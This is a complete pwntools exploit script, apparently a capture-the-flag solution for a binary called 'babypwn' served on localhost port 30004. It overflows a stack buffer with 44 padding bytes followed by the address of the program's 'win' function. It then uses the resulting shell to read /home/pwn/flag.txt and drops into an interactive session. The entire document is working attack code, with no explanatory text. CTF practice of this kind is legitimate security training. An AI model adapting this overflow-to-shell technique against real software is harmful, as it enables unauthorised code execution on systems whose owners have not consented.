#!/usr/bin/env python3

from pwn import *

HOST = "localhost"
PORT = 30004

elf = context.binary = ELF("babypwn")


def conn():
    if args.LOCAL:
        p = process(elf.path)
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote(HOST, PORT)

    return p


def main():
    p = conn()

    exploit = flat(
        b"A" * 44,
        elf.sym.win
    )

    p.recvline()
    p.recvline()

    p.sendline(exploit)

    p.recvline()

    log.success("Enjoy your shell!")

    p.sendline(b"/bin/cat /home/pwn/flag.txt")
    log.success(f"Flag: {p.recvline().strip().decode()}")

    p.interactive()


if __name__ == "__main__":
    main()
